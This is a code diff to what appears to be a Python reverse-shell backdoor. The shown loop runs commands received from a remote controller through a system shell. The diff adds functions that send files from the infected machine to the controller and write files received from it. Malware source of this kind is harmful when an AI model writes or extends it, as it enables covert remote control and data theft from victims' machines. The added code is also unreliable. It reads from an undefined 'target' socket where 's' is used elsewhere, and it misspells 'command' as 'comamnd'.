@@ -13,6 +13,22 @@ def reliable_recv():
         except ValueError:
             continue
 
+def download_file(file):
+    with open(file, "wb") as f:
+        s.settimeout(1)
+        chunk = target.recv(1024)
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = s.recv(1024)
+            except socket.timeout as e:
+                break
+    s.settimeout(None)
+
+def upload_file(file):
+    with open(file, "rb") as f:
+        s.send(f.read())
+
 def shell():
     while True:
         command = reliable_recv()
@@ -24,6 +40,12 @@ def shell():
 
         elif command == "clear":
             pass
+
+        elif command[:8] == "download":
+            upload_file(command[9:])
+
+        elif command[:6] == "upload":
+            download_file(comamnd[7:])
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
